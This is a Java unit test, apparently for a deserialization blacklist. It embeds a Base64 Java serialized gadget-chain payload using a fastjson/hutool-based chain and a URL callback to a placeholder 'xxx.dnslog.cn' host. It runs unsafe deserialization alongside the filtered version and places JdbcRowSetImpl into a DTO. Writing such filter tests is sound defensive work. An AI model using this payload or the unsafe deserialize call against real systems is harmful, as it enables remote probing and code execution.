package com.hzk.safe.payload.serializable.java.test;

import com.hzk.safe.payload.serializable.java.JavaSerializationUtil;
import com.hzk.safe.payload.serializable.common.dto.MserviceRequestDTO;
import org.junit.Test;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class JavaSerializationTest {

    @Test
    public void commonsBeanutils() throws Exception {
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");

        String base64code = "rO0ABXNyABFqYXZhLnV0aWwuVHJlZU1hcAzB9j4tJWrmAwABTAAKY29tcGFyYXRvcnQAFkxqYXZhL3V0aWwvQ29tcGFyYXRvcjt4cHB3BAAAAAJ0AA5wwqFnwrF+wqbCoHtse3QADGB5YF99PyfDjsOCGnQAE8OrZMOcwrXDq8OFwpPCscKTw49zcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXN9AAAAAQAOamF2YS5hd3QuU2hhcGV4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAbY24uaHV0b29sLmNvcmUubWFwLk1hcFByb3h5AAAAAAAAAAECAAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHNxAH4ABj9AAAAAAAAMdwgAAAAQAAAAAXQABmJvdW5kc3VyAAJbQqzzF/gGCFTgAgAAeHAAAAEfrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QADXh4eC5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHh4c3IALmphdmF4Lm1hbmFnZW1lbnQuQmFkQXR0cmlidXRlVmFsdWVFeHBFeGNlcHRpb27U59qrYy1GQAIAAUwAA3ZhbHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hyABNqYXZhLmxhbmcuRXhjZXB0aW9u0P0fPho7HMQCAAB4cgATamF2YS5sYW5nLlRocm93YWJsZdXGNSc5d7jLAwAETAAFY2F1c2V0ABVMamF2YS9sYW5nL1Rocm93YWJsZTtMAA1kZXRhaWxNZXNzYWdldAASTGphdmEvbGFuZy9TdHJpbmc7WwAKc3RhY2tUcmFjZXQAHltMamF2YS9sYW5nL1N0YWNrVHJhY2VFbGVtZW50O0wAFHN1cHByZXNzZWRFeGNlcHRpb25zdAAQTGphdmEvdXRpbC9MaXN0O3hwcHB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAABweHNyAB5jb20uYWxpYmFiYS5mYXN0anNvbi5KU09OQXJyYXkAAAAAAAAAAQIAAUwABGxpc3RxAH4AGnhwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAF3BAAAAAFxAH4AC3h4eA==";
        byte[] decodeBytes = Base64.getDecoder().decode(base64code);

        try {
            Object deserialize1 = JavaSerializationUtil.safeDeserialize(decodeBytes);
            System.out.println("check blacklist result=false");
        } catch (SecurityException se) {
            se.printStackTrace();
            System.err.println("check blacklist result=true");
        }

        Object deserialize = JavaSerializationUtil.deserialize(decodeBytes);
        System.out.println(deserialize);
    }

    public static void main(String[] args) throws Exception {
        MserviceRequestDTO dto = getDTO();
        byte[] bytes = JavaSerializationUtil.serialize(dto);
        // 不安全的反序列化
        MserviceRequestDTO newDto = (MserviceRequestDTO)JavaSerializationUtil.deserialize(bytes);
        System.out.println(newDto);


        byte[] bytes1 = JavaSerializationUtil.serialize(dto);
        // 安全的反序列化
        try {
            MserviceRequestDTO newDto1 = (MserviceRequestDTO)JavaSerializationUtil.safeDeserialize(bytes1);
            System.out.println(newDto1);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }





    private static MserviceRequestDTO getDTO(){
        MserviceRequestDTO requestDTO = new MserviceRequestDTO();
        requestDTO.setAge(18);
        requestDTO.setMoney(999l);
        requestDTO.setName("hzk");
        Map<String, Object> paramMap = new HashMap<>();
        paramMap.put("a", "1");
        paramMap.put("b", "2");
        // TODO 黑名单
        com.sun.rowset.JdbcRowSetImpl jdbcRowSet = new com.sun.rowset.JdbcRowSetImpl();
        paramMap.put("c", jdbcRowSet);
        requestDTO.setParamMap(paramMap);
        return requestDTO;
    }

}
